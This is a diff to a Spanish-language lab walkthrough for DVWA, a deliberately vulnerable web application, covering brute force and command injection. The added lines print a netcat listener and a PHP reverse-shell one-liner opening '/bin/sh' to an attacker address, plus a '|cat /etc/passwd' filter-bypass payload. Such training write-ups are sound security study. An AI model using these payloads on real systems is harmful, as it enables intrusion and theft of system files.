@@ -11,6 +11,7 @@ DVWA es una aplicación web PHP / MySQL vulnerable que sirve para practicar con 
 1. [Despliegue](https://github.com/sapellaniz/dvwa#despliegue)
 2. [Brute force](https://github.com/sapellaniz/dvwa#brute-force)
 3. [Command injection](https://github.com/sapellaniz/dvwa#command-injection)
+4. [file-inclusion](https://github.com/sapellaniz/dvwa#file-inclusion)
 
 # Despliegue
 
@@ -29,6 +30,8 @@ Una vez creada la base de datos, se puede acceder a la apliacación con las cred
 En la sección [DVWA Security](http://127.0.0.1/login.php) se puede configurar el nivel de dificultad del laboratorio.
 
 ![Security](https://github.com/sapellaniz/dvwa/blob/master/img/security.png)
+
+
 
 # Brute Force
 
@@ -49,6 +52,7 @@ hydra 127.0.0.1 -l admin -P fasttrack.txt http-get-form "/vulnerabilities/brute/
 
 ### Security: medium
 En el nivel medio de seguridad, la única protección es un delay de 2 segundos, si se le puede llamar protección a esto. Se puede explotar con el mismo comando que usamos para explotar la vulnerabilidad en nivel bajo de seguridad.
+
 
 
 # Command injection
@@ -79,16 +83,27 @@ Con el nivel de seguridad medio seleccionado, la única protección es que los b
 
 ![Command injection](https://github.com/sapellaniz/dvwa/blob/master/img/command-injection-02.png)
 
+Como atacantes, lo que más nos interesa en este punto es obtener una shell interactiva, para tener una mayor libertad y poder causar un mayor impacto:
+
+```
+# En el atacante:
+sudo rlwrap nc -nvlp 443
+# En DVWA
+php -r '$sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
 ### Security: high
 Con el nivel de seguridad alto seleccionado, la lista de badchars ha aumentado a "&", ";", "| ", "-", "$", "(", ")", "'" y "||". Si nos fijamos, se puede ver que el badchar "| " contiene un espacio después de la tubería, asi que si introducimos una tubería sin un espacio inmediatamente después, no será eliminada:
+
 ```
 |cat /etc/passwd
 ```
 
-REVERSE SHELL!!
+![Command injection](https://github.com/sapellaniz/dvwa/blob/master/img/command-injection-03.png)
+
+
 
 # File Inclusion
-###################
 
 (pantallazo)
 
